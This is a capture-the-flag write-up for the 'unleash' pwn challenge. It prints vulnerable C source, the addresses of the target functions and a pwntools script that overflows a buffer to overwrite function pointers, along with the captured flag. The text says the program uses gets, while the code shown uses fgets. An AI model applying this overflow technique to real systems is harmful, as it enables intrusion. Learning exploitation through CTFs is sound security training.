## unleash

### Challenge Description

Unleash the shell!  
```
nc challs.taparctf.ir 9001
```   
### Writeup
We are given a C file, its elf, and its corresponding server. There is a main function which uses ```gets``` and we know this function is vulnerable.  
There is 4 other functions defined in this `.c` file. Two of them are invoked in main. And the other 2 functions (which should be invoked in order to give us the flag) are not used anywhere.  
This is the file content:  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int UNLEASHED = 0;
void set_leasher(){
    printf("LEASHED!");
    UNLEASHED = 1;
}
void shell(){
    printf("Almost UNLEASHed!");
    if (UNLEASHED == 1)
    {
        char *buf;
        int fd = open("pwn/flag", O_RDONLY);
        read(fd, &buf, 50);
        printf("%.*s", 50, &buf);
    }
}

void HI(int num){
    printf("Hi Num: %d\n", num);
}

void seems(){
    printf("You look like one!\n");
}

int main(){
    setbuf(stdout, 0);
    int (*seem)() = seems;
    int (*hii)() = HI;
    char buffer[40];
    printf(" _______ _______ ______ _______ ______ _______ _______ _______ \n"
	"(_______|_______|_____ (_______|_____ (_______|_______|_______)\n"
	"    _    _______ _____) )______ _____) )          _    _____   \n"
	"   | |  |  ___  |  ____/  ___  |  __  / |        | |  |  ___)  \n"
	"   | |  | |   | | |    | |   | | |  \\ \\ |_____   | |  | |      \n"
	"   |_|  |_|   |_|_|    |_|   |_|_|   |_\\______)  |_|  |_|      \n"
	"\n\n=========================== unleash ===========================\n\n");
    printf("What Would a Hacker say!?\n> ");
    fgets(buffer, 50, stdin);
    hii();
    seem();
}
```  
If we overflow the input, and rewrite `seem` and `hii` pointers with address of `set_leasher` and `shell` function, these two will be run and we can get the flag. These are address of these two functions:  
```python
0x08048a9c  set_leasher
0x08048abf  shell
```  
This is the script we wrote:  
```python
from pwn import *
import pwn
conn = remote('challs.taparctf.ir', '9001')
#conn = process('./unleash')
print(conn.recvuntil("> "))
conn.sendline(40*'A' + pwn.p32(0x08048a9c) +  pwn.p32(0x08048abf))
print(conn.recvall())
```
This is the flag:  
```
Tapar{Unl34sh_y0uR_miNd}
```